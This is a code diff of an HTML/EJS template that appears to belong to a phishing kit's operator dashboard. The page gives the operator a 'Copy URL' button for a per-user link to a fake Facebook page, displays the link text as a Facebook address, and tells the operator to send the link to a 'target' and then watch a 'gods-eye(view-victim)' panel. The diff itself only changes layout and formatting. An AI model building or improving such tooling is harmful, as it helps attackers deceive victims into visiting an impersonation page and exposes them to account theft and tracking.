@@ -1,25 +1,26 @@
 <div class="content-inner">
     <div class="facebook">
-        <img src="/uploads/YouTube.jpg" alt="Dashboard Image" class="image">
 
-        <!-- Facebook Link -->
-        
-        
+        <div class="icon">
+            <i class="fa-brands fa-facebook"></i>
+        </div>
+
         <!-- Copy URL Button -->
         <div class="url">
-            <button onclick="copyURL()">Copy URL</button>
+            <button onclick="copyURL()"><i class="fa-solid fa-link"></i> Copy URL</button>
             <a href="/facebook?userId=<%= userId %>">https//www.facebook.com</a>
         </div>
 
-        <p><strong>Instruction:</strong> Copy the link and send it to your target, when the target hits in check yourgods-eye(view-victim) </p>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target, when the target hits in check your
+            gods-eye(view-victim) </p>
     </div>
-    
+
 </div>
-    <script>
-        function copyURL() {
-            const url = window.location.origin + '/facebook?userId=<%= userId %>';
-            navigator.clipboard.writeText(url).then(() => {
-                alert('URL copied to clipboard!');
-            });
-        }
-    </script>
+<script>
+    function copyURL() {
+        const url = window.location.origin + '/facebook?userId=<%= userId %>';
+        navigator.clipboard.writeText(url).then(() => {
+            alert('URL copied to clipboard!');
+        });
+    }
+</script>
